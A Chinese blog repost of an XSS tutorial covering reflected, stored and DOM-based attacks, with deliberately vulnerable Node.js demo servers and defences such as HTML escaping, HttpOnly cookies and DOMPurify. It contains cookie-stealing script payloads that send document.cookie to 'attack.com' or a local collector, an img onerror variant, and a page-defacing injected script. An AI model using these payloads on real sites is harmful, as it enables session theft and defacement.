<!DOCTYPE html>
<html lang="en-US">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>XSS攻防实战（附JS源码） | 个人主页</title>
    <meta name="generator" content="VuePress 1.9.9">
    <link rel="icon" href="/img/logo.ico">
    <link rel="apple-touch-icon" href="/img/logo.png">
    <meta name="description" content="rh的博客">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0;">
    
    <link rel="preload" href="/assets/css/0.styles.74a02103.css" as="style"><link rel="preload" href="/assets/js/app.54364397.js" as="script"><link rel="preload" href="/assets/js/2.ea1d54eb.js" as="script"><link rel="preload" href="/assets/js/66.1c5e2582.js" as="script"><link rel="prefetch" href="/assets/js/10.a13ce92a.js"><link rel="prefetch" href="/assets/js/11.c5493f60.js"><link rel="prefetch" href="/assets/js/12.0341abb4.js"><link rel="prefetch" href="/assets/js/13.ecaa558e.js"><link rel="prefetch" href="/assets/js/14.d55c9a2b.js"><link rel="prefetch" href="/assets/js/15.b24cd0ee.js"><link rel="prefetch" href="/assets/js/16.7c38e7c7.js"><link rel="prefetch" href="/assets/js/17.fd15e051.js"><link rel="prefetch" href="/assets/js/18.a3beb2d7.js"><link rel="prefetch" href="/assets/js/19.4f970c5e.js"><link rel="prefetch" href="/assets/js/20.35661968.js"><link rel="prefetch" href="/assets/js/21.ec64587c.js"><link rel="prefetch" href="/assets/js/22.6e07b501.js"><link rel="prefetch" href="/assets/js/23.ba36c783.js"><link rel="prefetch" href="/assets/js/24.b6707acb.js"><link rel="prefetch" href="/assets/js/25.2dbfa4d5.js"><link rel="prefetch" href="/assets/js/26.03e28b6f.js"><link rel="prefetch" href="/assets/js/27.fd4a5887.js"><link rel="prefetch" href="/assets/js/28.364e737b.js"><link rel="prefetch" href="/assets/js/29.29942848.js"><link rel="prefetch" href="/assets/js/3.c931e90d.js"><link rel="prefetch" href="/assets/js/30.9185c6d1.js"><link rel="prefetch" href="/assets/js/31.a35eac1d.js"><link rel="prefetch" href="/assets/js/32.8096a1e0.js"><link rel="prefetch" href="/assets/js/33.407a449d.js"><link rel="prefetch" href="/assets/js/34.e2f81dbb.js"><link rel="prefetch" href="/assets/js/35.028c502e.js"><link rel="prefetch" href="/assets/js/36.2de3185a.js"><link rel="prefetch" href="/assets/js/37.7608c3f2.js"><link rel="prefetch" href="/assets/js/38.20651de8.js"><link rel="prefetch" href="/assets/js/39.2f5a06ea.js"><link rel="prefetch" href="/assets/js/4.9cbc8b55.js"><link rel="prefetch" href="/assets/js/40.4be51e8d.js"><link rel="prefetch" href="/assets/js/41.36a2e3f0.js"><link rel="prefetch" href="/assets/js/42.2cbf9afa.js"><link rel="prefetch" href="/assets/js/43.ce1c8073.js"><link rel="prefetch" href="/assets/js/44.b494f3f7.js"><link rel="prefetch" href="/assets/js/45.34035be8.js"><link rel="prefetch" href="/assets/js/46.ed534a1d.js"><link rel="prefetch" href="/assets/js/47.64e976a5.js"><link rel="prefetch" href="/assets/js/48.e197e0d5.js"><link rel="prefetch" href="/assets/js/49.f76dee05.js"><link rel="prefetch" href="/assets/js/5.1508cebe.js"><link rel="prefetch" href="/assets/js/50.ac9a636f.js"><link rel="prefetch" href="/assets/js/51.d924871e.js"><link rel="prefetch" href="/assets/js/52.388f4e26.js"><link rel="prefetch" href="/assets/js/53.f60541dc.js"><link rel="prefetch" href="/assets/js/54.f37be02d.js"><link rel="prefetch" href="/assets/js/55.06e6ce80.js"><link rel="prefetch" href="/assets/js/56.5f19dd4d.js"><link rel="prefetch" href="/assets/js/57.9398ec97.js"><link rel="prefetch" href="/assets/js/58.503e48ce.js"><link rel="prefetch" href="/assets/js/59.35603c7d.js"><link rel="prefetch" href="/assets/js/6.3c902562.js"><link rel="prefetch" href="/assets/js/60.f34179ae.js"><link rel="prefetch" href="/assets/js/61.c16de7a0.js"><link rel="prefetch" href="/assets/js/62.ac7dd70d.js"><link rel="prefetch" href="/assets/js/63.1f724cb5.js"><link rel="prefetch" href="/assets/js/64.85777ea3.js"><link rel="prefetch" href="/assets/js/65.270d5490.js"><link rel="prefetch" href="/assets/js/67.87624fec.js"><link rel="prefetch" href="/assets/js/68.aca2d12f.js"><link rel="prefetch" href="/assets/js/69.a714dcd7.js"><link rel="prefetch" href="/assets/js/7.49f43c50.js"><link rel="prefetch" href="/assets/js/8.687ec09d.js"><link rel="prefetch" href="/assets/js/9.0a3f6f96.js">
    <link rel="stylesheet" href="/assets/css/0.styles.74a02103.css">
  </head>
  <body>
    <div id="app" data-server-rendered="true"><div class="theme-container"><header class="navbar"><div class="sidebar-button"><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" role="img" viewBox="0 0 448 512" class="icon"><path fill="currentColor" d="M436 124H12c-6.627 0-12-5.373-12-12V80c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12z"></path></svg></div> <a href="/" class="home-link router-link-active"><img src="/img/logo.png" alt="个人主页" class="logo"> <span class="site-name can-hide">个人主页</span></a> <div class="links"><div class="search-box"><input aria-label="Search" autocomplete="off" spellcheck="false" value=""> <!----></div> <nav class="nav-links can-hide"><div class="nav-item"><a href="/" class="nav-link">
  主页
</a></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="博客文章" class="dropdown-title"><span class="title">博客文章</span> <span class="arrow down"></span></button> <button type="button" aria-label="博客文章" class="mobile-dropdown-title"><span class="title">博客文章</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/test/" class="nav-link">
  测试
</a></li><li class="dropdown-item"><!----> <a href="/frontend/" class="nav-link">
  前端
</a></li><li class="dropdown-item"><!----> <a href="/linux/" class="nav-link">
  linux
</a></li><li class="dropdown-item"><!----> <a href="/other/" class="nav-link router-link-active">
  杂文
</a></li><li class="dropdown-item"><!----> <a href="/node/" class="nav-link">
  Node
</a></li><li class="dropdown-item"><!----> <a href="/python/" class="nav-link">
  Python
</a></li></ul></div></div><div class="nav-item"><a href="/readlog.html" class="nav-link">
  阅读日志
</a></div><div class="nav-item"><a href="/about/" class="nav-link">
  关于
</a></div> <a href="https://github.com/JoeHR/vuePress-blog" target="_blank" rel="noopener noreferrer" class="repo-link">
    Github
    <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></nav></div></header> <div class="sidebar-mask"></div> <aside class="sidebar"><nav class="nav-links"><div class="nav-item"><a href="/" class="nav-link">
  主页
</a></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="博客文章" class="dropdown-title"><span class="title">博客文章</span> <span class="arrow down"></span></button> <button type="button" aria-label="博客文章" class="mobile-dropdown-title"><span class="title">博客文章</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/test/" class="nav-link">
  测试
</a></li><li class="dropdown-item"><!----> <a href="/frontend/" class="nav-link">
  前端
</a></li><li class="dropdown-item"><!----> <a href="/linux/" class="nav-link">
  linux
</a></li><li class="dropdown-item"><!----> <a href="/other/" class="nav-link router-link-active">
  杂文
</a></li><li class="dropdown-item"><!----> <a href="/node/" class="nav-link">
  Node
</a></li><li class="dropdown-item"><!----> <a href="/python/" class="nav-link">
  Python
</a></li></ul></div></div><div class="nav-item"><a href="/readlog.html" class="nav-link">
  阅读日志
</a></div><div class="nav-item"><a href="/about/" class="nav-link">
  关于
</a></div> <a href="https://github.com/JoeHR/vuePress-blog" target="_blank" rel="noopener noreferrer" class="repo-link">
    Github
    <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></nav>  <ul class="sidebar-links"><li><a href="/other/" aria-current="page" class="sidebar-link">圈复杂度</a></li><li><a href="/other/gitment.html" class="sidebar-link">Gitment</a></li><li><a href="/other/vscode插件配置.html" class="sidebar-link">VS Code 配置 Vue 开发环境 - Vetur+ESLint+Prettier（2020）</a></li></ul> </aside> <main class="page"> <div class="theme-default-content content__default"><h2 id="xss攻防实战-附js源码"><a href="#xss攻防实战-附js源码" class="header-anchor">#</a> XSS攻防实战（附JS源码）</h2> <p>乔珂力 [前端瓶子君](javascript:void(0)😉 <em>今天</em></p> <blockquote><p>授权转载自：乔珂力</p> <p>https://juejin.im/post/6867184627393265677</p></blockquote> <p>之前写过两篇文章分别介绍了 Cookie ：https://juejin.im/post/6863377752939036679 和 JSON Web Token：https://juejin.im/post/6854573220457086984，很多网站会在用户登录完毕设置 Cookie 值或者返回一个 Token，这就相当于令牌，只要拿着这张令牌就等同于证明了你是某个用户。如果防御不到位，Cookie 和 Token 很容易被 XSS 攻击窃取到，此时攻击者就可以冒充真实的用户，在网站中为所欲为了。</p> <p>XSS 的全称叫跨站脚本攻击（Cross Site Scripting），攻击出现的原因一般是因为 Web 程序对用户的输入过滤不足导致的一种漏洞，攻击者可以把恶意的脚本代码注入到网页之中，当其他用户浏览时就会执行其中的恶意代码，对受害者产生各种攻击。XSS 一般分为三种类型：</p> <ul><li>反射型</li> <li>存储型</li> <li>DOM型</li></ul> <h2 id="反射型-xss-攻防实战"><a href="#反射型-xss-攻防实战" class="header-anchor">#</a> 反射型 XSS 攻防实战</h2> <p>反射型 XSS 攻击的恶意脚本并没有被存储到后端数据库中，而是诱导用户点击某个精心拼接的恶意链接，从而达到攻击的目的。</p> <h3 id="攻击案例"><a href="#攻击案例" class="header-anchor">#</a> 攻击案例</h3> <p>一个常见的场景是用户在某电影网站搜索，假如请求地址是：</p> <div class="language- extra-class"><pre class="language-text"><code>https://xxx.com/movies?q=功夫熊猫
</code></pre></div><p>在后台返回的结果页中，会显示用户搜索的电影名：</p> <div class="language- extra-class"><pre class="language-text"><code>「功夫熊猫」的搜索结果为：xxxxxxxxxxxxxxxxxxxxxxx
</code></pre></div><p>攻击者拼接了一个极度恶意的链接：</p> <div class="language- extra-class"><pre class="language-text"><code>https://xxx.com/movies?q=功夫熊猫&lt;script&gt;fetch(`https://attack.com?cookie=${document.cookie}`)&lt;/script&gt;
</code></pre></div><p>如果用户点击了这个恶意链接，cookie 立马被盗。下面给出 <code>Node.js</code> 后端服务完整源码：</p> <div class="language- extra-class"><pre class="language-text"><code>const http = require('http')const URL = require('url')// HTML 模板function renderHTML(tpl) {  return `&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta charset=&quot;UTF-8&quot;/&gt;&lt;/head&gt;&lt;body&gt;${tpl}&lt;/body&gt;&lt;/html&gt;`}// 路由分发器const routes = {  'GET /movies': (req, res) =&gt; { // 被攻击网站的电影搜索接口    const tpl = req.query.q      ? `&lt;h3&gt;「${req.query.q}」的搜索结果为：&lt;/h3&gt;${Array(30).fill('x')}`      : `请输入搜索的电影`    res.setHeader('Set-Cookie', ['name=keliq', 'age=10'])    res.end(renderHTML(tpl))  },  'GET /cookies': (req, res) =&gt; { // 攻击者后台收集cookie的接口    console.log(req.query)    res.end()  },}function onRequest(req, res) {  const { url, method } = req  const { query, pathname } = URL.parse(url, true) // 解析 url  Object.assign(req, { query, path: pathname }) // 并把 query 和 pathname 参数扩展到 req 对象  const route = routes[[method, pathname].join(' ')] // 获取路由处理函数（策略模式）  if (route) return route(req, res)  res.statusCode = 404  res.end('Not Found')}http.createServer(onRequest).listen(3000) // 被攻击的网站http.createServer(onRequest).listen(4000) // 攻击者收集cookie的服务器
</code></pre></div><p>运行上面的代码，然后打开访问下面的恶意链接：</p> <div class="language- extra-class"><pre class="language-text"><code>http://localhost:3000/movies?q=功夫熊猫&lt;script&gt;fetch(`http://localhost:4000/cookies?cookie=${document.cookie}`)&lt;/script&gt;
</code></pre></div><p>可以看到，用户的 Cookie 被发送到了攻击者的服务器。</p> <h3 id="防御方案"><a href="#防御方案" class="header-anchor">#</a> 防御方案</h3> <p>造成反射型 XSS 攻击的原因就是服务端没过滤，所以解决方案也很简单，就是在服务器对用户输入进行过滤，过滤方案一般有很多，例如直接用 <code>encodeURIComponent</code> 对查询参数进行过滤：</p> <div class="language- extra-class"><pre class="language-text"><code>const tpl = req.query.q  ? `&lt;h3&gt;「${encodeURIComponent(req.query.q)}」的搜索结果为：&lt;/h3&gt;${Array(30).fill('x')}`  : `请输入搜索的电影`
</code></pre></div><p>还有一种方式是写一个函数替换掉那些 <code>&lt;</code>、<code>&amp;</code> 等特殊字符：</p> <div class="language- extra-class"><pre class="language-text"><code>function encodeHTML(str) {  return str  .replace(/&amp;/g,'&amp;amp;')  .replace(/&quot;/g,'&amp;quot;')  .replace(/'/g,'&amp;apos;')  .replace(/&lt;/g,'&amp;lt;')  .replace(/&gt;/g,'&amp;gt;')}
</code></pre></div><p>另外，如果后端登录验证是基于 Cookie 的话，一定要设置其属性为 HttpOnly，这样攻击者无法利用 JS 脚本获取到 Cookie 了。</p> <h2 id="存储型-xss-攻防实战"><a href="#存储型-xss-攻防实战" class="header-anchor">#</a> 存储型 XSS 攻防实战</h2> <p>与反射型不同，存储型 XSS 攻击是指当用户的输入包含了恶意脚本，服务端转义就存储到数据库，访问页面会触发恶意脚本执行，而导致的攻击。</p> <h3 id="攻击案例-2"><a href="#攻击案例-2" class="header-anchor">#</a> 攻击案例</h3> <p>假如在某网站上有一篇爆款文章：</p> <div class="language- extra-class"><pre class="language-text"><code>https://xxx.com/articles/1
</code></pre></div><p>攻击者在文章下面发表了一篇评论，内容中包含了 script 脚本：</p> <div class="language- extra-class"><pre class="language-text"><code>文章写的真棒！&lt;script&gt;fetch(`http://localhost:4000/cookies?cookie=${document.cookie}`)&lt;/script&gt;
</code></pre></div><p>如果服务端直接把评论字符串保存到数据库了，下次只要有用户访问该文章时，包含恶意脚本的评论内容被返回，把当前用户的 cookie 发送到攻击者的服务器！下面是完整的 <code>Node.js</code> 服务端源码：</p> <div class="language- extra-class"><pre class="language-text"><code>const http = require('http')const URL = require('url')const qs = require('querystring')// 模拟文章数据库const article = {  id: 1,  title: '体育新闻',  content:    '火箭在对阵雷霆首轮系列赛的第5场比赛中以114-80战胜对手，但在这场比赛中更受关注的还是丹尼斯-施罗德和PJ塔克之间的冲突导致两人都被驱逐，当然，在这场比赛之后火箭已经手握3-2的领先优势。',  comments: ['评论1', '评论2'],}// HTML 模板function renderHTML(tpl) {  return `&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta charset=&quot;UTF-8&quot;/&gt;&lt;/head&gt;&lt;body&gt;${tpl}&lt;/body&gt;&lt;/html&gt;`}// 路由分发器const routes = {  'GET /articles/1': (req, res) =&gt; {    const tpl = `    &lt;div style=&quot;width: 500px;margin: auto;&quot;&gt;      &lt;h1&gt;${article.title}&lt;/h1&gt;      &lt;p&gt;${article.content}&lt;/p&gt;      &lt;h3&gt;评论区&lt;/h3&gt;      &lt;ul&gt;${article.comments        .map((item) =&gt; '&lt;li&gt;' + item + '&lt;/li&gt;')        .join('')}&lt;/ul&gt;      &lt;hr/&gt;      &lt;p&gt;请发表您的评论：&lt;/p&gt;      &lt;form action=&quot;/comments&quot; method=&quot;post&quot;&gt;        &lt;textarea lines=&quot;3&quot; maxlength=&quot;1000&quot; name=&quot;comment&quot; &gt;&lt;/textarea&gt;        &lt;button type=&quot;submit&quot;&gt;提交&lt;/button&gt;      &lt;/form&gt;    &lt;/div&gt;    `    res.setHeader('Set-Cookie', ['name=keliq', 'age=10'])    res.end(renderHTML(tpl))  },  'POST /comments': async (req, res) =&gt; {    let body = await getBody(req)    let { comment = '' } = qs.parse(body)    comment = comment.trim()    if (comment) { // 为防止内存溢出，只保留最新10条评论      article.comments = [comment, ...article.comments.slice(0, 9)]    }    res.writeHead(301, { Location: '/articles/1' })    res.end()  },  'GET /cookies': (req, res) =&gt; {    console.log(req.query)    res.end()  },  'GET /malicious.js': (req, res) =&gt; {    const script = `document.body.innerHTML = '美女荷棺在线發牌&lt;img width=200 src=&quot;http://img.zlib.cn/beauty/1.jpg&quot; /&gt;'`    res.end(script)  },}// 获取 req.bodyfunction getBody(req) {  return new Promise((resolve, reject) =&gt; {    const arr = []    req      .on('data', (data) =&gt; arr.push(data))      .on('end', () =&gt;resolve(decodeURIComponent(Buffer.concat(arr).toString())))      .on('error', reject)  })}function onRequest(req, res) {  const { url, method } = req  const { query, pathname } = URL.parse(url, true) // 解析 url  Object.assign(req, { query, path: pathname }) // 并把 query 和 pathname 参数扩展到 req 对象  const route = routes[[method, pathname].join(' ')] // 获取路由处理函数（策略模式）  if (route) return route(req, res)  res.statusCode = 404  res.end('Not Found')}http.createServer(onRequest).listen(3000) // 被攻击的网站http.createServer(onRequest).listen(4000) // 攻击者收集cookie的服务器
</code></pre></div><p>运行上面的代码，然后打开网站 <code>http://localhost:3000/articles/1</code>，发表一则评论：</p> <div class="language- extra-class"><pre class="language-text"><code>文章写的真棒！&lt;script&gt;fetch(`http://localhost:4000/cookies?cookie=${document.cookie}`)&lt;/script&gt;
</code></pre></div><p>可以看到，用户的 Cookie 马上被发送到了攻击者的服务器。其实这种获取 Cookie 的方式还算小打小闹了，只要能够利用 xss 注入 script，黑客真的是可以「为所欲为」，例如黑客通过操作 DOM 的方式，分分钟把你的网站变成赌博网站、色情网站...，不信的话你输入下面的评论试试（内含福利）：</p> <div class="language- extra-class"><pre class="language-text"><code>文章写的真棒！&lt;script src=&quot;http://localhost:4000/malicious.js&quot;&gt;&lt;/script&gt;
</code></pre></div><p>在这个恶意脚本 <code>malicious.js</code> 里面，直接改掉了 body，想想看，所有访问你的网站的用户，看到的其实是另外一番景象，太吓人了。</p> <h3 id="防御方案-2"><a href="#防御方案-2" class="header-anchor">#</a> 防御方案</h3> <p>可以看到，存储型 XSS 也是因为恶意代码未经转义直接被插入到响应的 HTML 里的，然后被浏览器执行导致攻击，所以解决方案也是对用户输入进行过滤，过滤方案与上面讲的反射型一致，可以根据需要选择过滤时机，例如：</p> <ul><li>客户端提交前进行校验过滤，如果包含恶意脚本则不提交，或者提交转义后的字符串</li> <li>服务端接收后先校验过滤，如果包含恶意脚本则不存储到数据库，或者存储转义后的字符串</li> <li>客户端渲染时候进行过滤，即使数据库中存储了未经转义的恶意脚本，输出转义后的字符串</li></ul> <h2 id="dom-型-xss-攻防实战"><a href="#dom-型-xss-攻防实战" class="header-anchor">#</a> DOM 型 XSS 攻防实战</h2> <p>DOM 型 XSS 与反射型或存储型 XSS 的区别在于，DOM 型在服务器返回的网页或脚本中是看不到恶意代码的，而是在更新 DOM 树的时候触发了恶意脚本的执行。</p> <h3 id="攻击案例-3"><a href="#攻击案例-3" class="header-anchor">#</a> 攻击案例</h3> <p>我们来看一则模拟案例，前端开发人员未经过滤就直接把用户输入插入到 HTML 中：</p> <div class="language- extra-class"><pre class="language-text"><code>&lt;input id=&quot;input&quot; type=&quot;text&quot; /&gt;&lt;button onclick=&quot;container.innerHTML = input.value&quot;&gt;点击&lt;/button&gt;&lt;p id=&quot;container&quot;&gt;&lt;/p&gt;
</code></pre></div><p>试想一下，如果此时用户输入了下面一段恶意脚本的话会发生什么？</p> <div class="language- extra-class"><pre class="language-text"><code>&lt;script&gt;fetch(`https://attack.com?cookie=${document.cookie}`)&lt;/script&gt;
</code></pre></div><p>值得庆幸的是，大部分现代浏览器都实现了 HTML5 的安全规范：</p> <blockquote><p>不执行由 innerHTML 插入的 script 标签。</p></blockquote> <p>但是这就足够安全了吗？非也，请看下面的输入：</p> <div class="language- extra-class"><pre class="language-text"><code>&lt;img src=&quot;x&quot; onerror=&quot;fetch(`http://localhost:4000/cookies?cookie=${document.cookie}`)&quot;&gt;
</code></pre></div><p>恶意脚本依然在 onerror 回调中被触发了！</p> <h3 id="防御方案-3"><a href="#防御方案-3" class="header-anchor">#</a> 防御方案</h3> <p>这里推荐使用 DOMPurify 库对用户的输入进行过滤，然后再使用 innerHTML 插入到 DOM 中。</p> <h2 id="总结"><a href="#总结" class="header-anchor">#</a> 总结</h2> <p>反射型 XSS 攻击的手段就是诱导用户点击，这种攻击是一次性的，用户点击就中招，不点就没事，危害性不如存储型的大，但是小白用户很容易被盗号。</p> <p>存储型 XSS 攻击范围广，受害面积大，且不容易及时发现和排查，一定要多加小心，对于用户输入的任何内容都不要完全信任，对于动态渲染的文本一定要进行转义。</p> <p>DOM 型 XSS 攻击随着单页面应用普及和流行愈发常见，因为在单页面应用中 JS 经常操作 DOM，而 DOM 型 XSS 攻击就是利用了浏览器解析机制，因此很容易触发 DOM 型 XSS 攻击。不过好在大部分前端框架，例如 Vue、Angular 都内置 DOM 型 XSS 攻击的防御机制。</p></div> <footer class="page-edit"><!----> <div class="last-updated"><span class="prefix">最后更新时间:</span> <span class="time">11/13/2020, 2:09:46 PM</span></div></footer> <!----> </main></div><div class="global-ui"><!----></div></div>
    <script src="/assets/js/app.54364397.js" defer></script><script src="/assets/js/2.ea1d54eb.js" defer></script><script src="/assets/js/66.1c5e2582.js" defer></script>
  </body>
</html>
